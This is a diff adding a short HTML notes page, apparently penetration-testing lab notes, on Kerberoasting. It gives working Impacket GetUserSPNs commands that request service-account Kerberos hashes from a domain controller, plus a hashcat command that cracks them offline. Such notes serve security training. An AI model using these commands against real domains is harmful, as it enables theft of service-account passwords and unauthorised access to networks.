@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>GetUserSPNs</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>GetUserSPNs</h1><br/><strong>GetUserSPNs</strong><br /><br /><strong>Kerberoasting with Impacket </strong><br /><br /><em>We will get the hash of service accounts</em><br /><br />1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located<br />2.) <em><strong>sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.172.59 -request</strong></em> - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.<br /><br />	<strong>impacket-GetUserSPNs CONTROLLER.local/Administrator:&#39;P@$$W0rd&#39; -dc-ip 10.10.172.59 -request</strong><br /><br /><br />3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash<br />Once the hash is cracked we get the password.</div>
+</body>
+</html>
